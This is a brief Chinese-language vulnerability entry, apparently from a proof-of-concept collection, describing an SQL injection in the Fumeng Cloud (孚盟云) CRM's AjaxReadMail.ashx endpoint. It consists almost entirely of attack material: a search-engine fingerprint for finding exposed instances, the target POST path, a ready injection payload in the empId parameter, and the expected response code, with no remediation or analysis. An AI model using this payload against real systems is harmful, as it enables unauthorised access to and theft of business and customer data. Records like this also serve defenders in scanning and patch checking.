# 孚盟云CRMAjaxReadMail.ashx存在SQL注入漏洞

孚盟云 ｜ SQL注入 ｜ —
- **指纹**：`app="孚盟软件-孚盟云"`
- **请求**：`POST /m/Dingding/Ajax/AjaxReadMail.ashx HTTP/1.1`

**Payload**
```
method=getHeadImage&empId=’-1/user--
```
- **响应特征**：200